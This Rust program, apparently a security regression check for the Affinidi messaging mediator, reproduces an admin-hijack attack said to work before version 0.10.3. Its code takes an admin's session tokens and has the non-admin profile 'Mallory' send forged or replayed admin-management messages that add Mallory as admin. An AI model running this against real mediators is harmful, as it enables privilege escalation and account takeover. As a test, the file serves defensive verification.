/*! Reproducible attack vector to hijack an admin account
 *
 * This is a demonstration of a potential attack vector that can be used to hijack an admin account.
 * Prior to versions 0.10.3 this could be used
 *
 *  1. Start with an admin account
 *  2. Apply the authorization tokens to a non-admin account
 *  3. Use the non-admin account to access an admin function
 *
 * This uses a number of attack vectors to try and attack the mediator
 * 1. Hijack the admin session credentials, send anonymously
 * 2. Hijack the admin session credentials and send as Mallory to bypass anon messaging checks
 * 3. Create a valid Admin message signed by the admin, but sent via Mallory
 *
 * */

use affinidi_did_authentication::AuthorizationTokens;
use affinidi_messaging_didcomm::Message;
use affinidi_messaging_sdk::{errors::ATMError, profiles::ATMProfile, protocols::Protocols};
use affinidi_tdk::{TDK, common::config::TDKConfig};
use clap::Parser;
use serde_json::json;
use sha256::digest;
use std::{env, sync::Arc, time::SystemTime};
use tracing::{info, warn};
use tracing_subscriber::filter;
use uuid::Uuid;

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    /// Environment to use
    #[arg(short, long)]
    environment: Option<String>,

    /// Path to the environments file (defaults to environments.json)
    #[arg(short, long)]
    path_environments: Option<String>,
}

#[tokio::main]
async fn main() -> Result<(), ATMError> {
    let args: Args = Args::parse();

    // construct a subscriber that prints formatted traces to stdout
    let subscriber = tracing_subscriber::fmt()
        // Use a more compact, abbreviated log format
        .with_env_filter(filter::EnvFilter::from_default_env())
        .finish();
    // use that subscriber to process traces emitted after this point
    tracing::subscriber::set_global_default(subscriber).expect("Logging failed, exiting...");

    let environment_name = if let Some(environment_name) = &args.environment {
        environment_name.to_string()
    } else if let Ok(environment_name) = env::var("TDK_ENVIRONMENT") {
        environment_name
    } else {
        "default".to_string()
    };

    info!("Using Environment: {}", environment_name);

    // Instantiate TDK
    let tdk = TDK::new(
        TDKConfig::builder()
            .with_environment_name(environment_name.clone())
            .build()?,
        None,
    )
    .await?;

    let environment = &tdk.get_shared_state().environment;
    let atm = tdk.atm.clone().unwrap();
    let protocols = Protocols::new();

    // Add and activate the admin profile
    let tdk_admin = if let Some(admin) = &environment.admin_did {
        tdk.add_profile(admin).await;
        admin
    } else {
        return Err(ATMError::ConfigError(
            format!("ADMIN not found in Profile: {}", environment_name).to_string(),
        ));
    };
    let atm_admin = atm
        .profile_add(&ATMProfile::from_tdk_profile(&atm, tdk_admin).await?, true)
        .await?;
    info!("Admin profile active");

    // Check if actually admin?
    match protocols.mediator.account_get(&atm, &atm_admin, None).await {
        Ok(Some(account)) => {
            if account._type.is_admin() {
                info!("Verified Admin account - OK");
            } else {
                return Err(ATMError::ConfigError(
                    "Admin account is actually not an ADMIN level account!!!".to_string(),
                ));
            }
        }
        Ok(None) => {
            return Err(ATMError::ConfigError("Admin account not found".to_string()));
        }
        Err(e) => {
            return Err(ATMError::ConfigError(
                format!("Error getting ADMIN account: {}", e).to_string(),
            ));
        }
    }

    // Add and activate the non-admin profile
    let tdk_mallory = if let Some(mallory) = environment.profiles.get("Mallory") {
        tdk.add_profile(mallory).await;
        mallory
    } else {
        return Err(ATMError::ConfigError(
            format!("Mallory not found in Profile: {}", environment_name).to_string(),
        ));
    };
    let atm_mallory = atm
        .profile_add(
            &ATMProfile::from_tdk_profile(&atm, tdk_mallory).await?,
            true,
        )
        .await?;
    info!("Mallory profile active");

    // Check if actually not-admin?
    match protocols
        .mediator
        .account_get(&atm, &atm_mallory, None)
        .await
    {
        Ok(Some(account)) => {
            if !account._type.is_admin() {
                info!("Verified Non-Admin account - OK");
            } else {
                return Err(ATMError::ConfigError(
                    "Mallory is an ADMIN level account!!!".to_string(),
                ));
            }
        }
        Ok(None) => {
            return Err(ATMError::ConfigError(
                "Mallory account not found".to_string(),
            ));
        }
        Err(e) => {
            return Err(ATMError::ConfigError(
                format!("Error getting Mallory account: {}", e).to_string(),
            ));
        }
    }

    // Mediator for this demo
    let Some(mediator) = environment.default_mediator.clone() else {
        return Err(ATMError::ConfigError(
            format!("Mediator not found in Environment: {}", environment_name).to_string(),
        ));
    };

    // Try and do an admin function with Mallory
    info!("Trying to access an admin function with Mallory");
    match protocols
        .mediator
        .accounts_list(&atm, &atm_mallory, None, None)
        .await
    {
        Ok(_) => {
            warn!("Mallory was able to access an admin function - NOT OK");
        }
        Err(_) => {
            info!("Mallory was not able to access an admin function - OK");
        }
    }

    // Hijack credentials
    info!("Starting hijack of admin credentials...");
    let admin_tokens = match tdk
        .get_shared_state()
        .authentication
        .authenticated(tdk_admin.did.clone(), mediator.clone())
        .await
    {
        Some(tokens) => tokens,
        None => {
            return Err(ATMError::ConfigError("Admin tokens not found".to_string()));
        }
    };
    info!("Admin tokens hijacked");

    info!("Shutdown Admin profile so there is no conflict with Mallory");
    atm.profile_remove(&atm_admin.inner.alias).await?;

    // Manually create a bad admin message
    info!("  *************************************************************");
    info!("  Attempting to hijack anonymously an admin session with Mallory");
    info!("  *************************************************************");
    let now = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .unwrap()
        .as_secs();

    let bad_msg = Message::build(
        Uuid::new_v4().into(),
        "https://didcomm.org/mediator/1.0/admin-management".to_owned(),
        json!({"admin_add": [digest(&atm_mallory.inner.did)]}),
    )
    .to(mediator.clone())
    .created_time(now)
    .expires_time(now + 10)
    .finalize();

    info!(
        "Created bad admin message that is from naughty Mallory...\n:{:#?}",
        bad_msg
    );

    info!("Packing message anonymously - don't link it to Mallory");
    let (msg, _) = atm
        .pack_encrypted(&bad_msg, &mediator, None, None, None)
        .await?;

    info!("Sending bad admin message to mediator");
    http_post(&tdk, &atm_mallory, &msg, &admin_tokens).await;

    // Lets check if Mallory is an admin?
    match protocols
        .mediator
        .account_get(&atm, &atm_mallory, None)
        .await
    {
        Ok(Some(account)) => {
            if account._type.is_admin() {
                warn!("Mallory is now an ADMIN level account - NOT OK!!!!");
            } else {
                info!("Mallory is still a non admin... Phew....");
            }
        }
        Ok(None) => {
            return Err(ATMError::ConfigError(
                "Mallory account not found".to_string(),
            ));
        }
        Err(e) => {
            return Err(ATMError::ConfigError(
                format!("Error getting Mallory account: {}", e).to_string(),
            ));
        }
    }

    // Try now with signed messages
    info!("  *************************************************************");
    info!("  Attempting to hijack an admin session as Mallory");
    info!("  *************************************************************");

    let now = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .unwrap()
        .as_secs();

    let bad_msg = Message::build(
        Uuid::new_v4().into(),
        "https://didcomm.org/mediator/1.0/admin-management".to_owned(),
        json!({"admin_add": [digest(&atm_mallory.inner.did)]}),
    )
    .to(mediator.clone())
    .from(atm_mallory.inner.did.clone())
    .created_time(now)
    .expires_time(now + 10)
    .finalize();

    info!(
        "Created bad admin message that is from naughty Mallory...\n:{:#?}",
        bad_msg
    );

    info!("Packing message from Mallory");
    let (msg, _) = atm
        .pack_encrypted(
            &bad_msg,
            &mediator,
            Some(atm_mallory.dids()?.0),
            Some(atm_mallory.dids()?.0),
            None,
        )
        .await?;

    info!("Sending bad admin message to mediator");
    http_post(&tdk, &atm_mallory, &msg, &admin_tokens).await;

    // Lets check if Mallory is an admin?
    match protocols
        .mediator
        .account_get(&atm, &atm_mallory, None)
        .await
    {
        Ok(Some(account)) => {
            if account._type.is_admin() {
                warn!("Mallory is now an ADMIN level account - NOT OK!!!!");
            } else {
                info!("Mallory is still a non admin... Phew....");
            }
        }
        Ok(None) => {
            return Err(ATMError::ConfigError(
                "Mallory account not found".to_string(),
            ));
        }
        Err(e) => {
            return Err(ATMError::ConfigError(
                format!("Error getting Mallory account: {}", e).to_string(),
            ));
        }
    }

    // Try now with signed messages
    info!("  *************************************************************");
    info!("  Attempting to resend a valid Admin message using Mallory");
    info!("  *************************************************************");

    let now = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .unwrap()
        .as_secs();

    let bad_msg = Message::build(
        Uuid::new_v4().into(),
        "https://didcomm.org/mediator/1.0/admin-management".to_owned(),
        json!({"admin_add": [digest(&atm_mallory.inner.did)]}),
    )
    .to(mediator.clone())
    .from(atm_admin.inner.did.clone())
    .created_time(now)
    .expires_time(now + 10)
    .finalize();

    let msg_id = bad_msg.id.clone();

    info!("Created valid admin message...");

    info!("Packing message from Admin");
    let (msg, _) = atm
        .pack_encrypted(
            &bad_msg,
            &mediator,
            Some(atm_admin.dids()?.0),
            Some(atm_admin.dids()?.0),
            None,
        )
        .await?;

    info!("Sending good admin message to mediator but from Mallory Session");
    match atm
        .send_message(&atm_mallory, &msg, &msg_id, true, false)
        .await
    {
        Ok(_) => {
            info!("Message sent successfully");
        }
        Err(e) => {
            warn!("Error sending message: {}", e);
        }
    }

    // Lets check if Mallory is an admin?
    match protocols
        .mediator
        .account_get(&atm, &atm_mallory, None)
        .await
    {
        Ok(Some(account)) => {
            if account._type.is_admin() {
                warn!("Mallory is now an ADMIN level account - NOT OK!!!!");
            } else {
                info!("Mallory is still a non admin... Phew....");
            }
        }
        Ok(None) => {
            return Err(ATMError::ConfigError(
                "Mallory account not found".to_string(),
            ));
        }
        Err(e) => {
            return Err(ATMError::ConfigError(
                format!("Error getting Mallory account: {}", e).to_string(),
            ));
        }
    }

    Ok(())
}

async fn http_post(
    tdk: &TDK,
    profile: &Arc<ATMProfile>,
    msg: &str,
    admin_tokens: &AuthorizationTokens,
) {
    let response = tdk
        .get_shared_state()
        .client
        .post([&profile.get_mediator_rest_endpoint().unwrap(), "/inbound"].concat())
        .header("Content-Type", "application/json")
        .header(
            "Authorization",
            format!("Bearer {}", admin_tokens.access_token),
        )
        .body(msg.to_string())
        .send()
        .await
        .expect("HTTP Post failed");

    let response_status = response.status();
    let response_body = response.text().await.expect("Failed to get response body");

    if !response_status.is_success() {
        if response_status.as_u16() == 401 {
            warn!("Permission Denied (401: Unauthorized)");
        } else {
            warn!("HTTP Error: {}\n{}", response_status, response_body);
        }
    }

    info!("response body: {}", response_body);
}
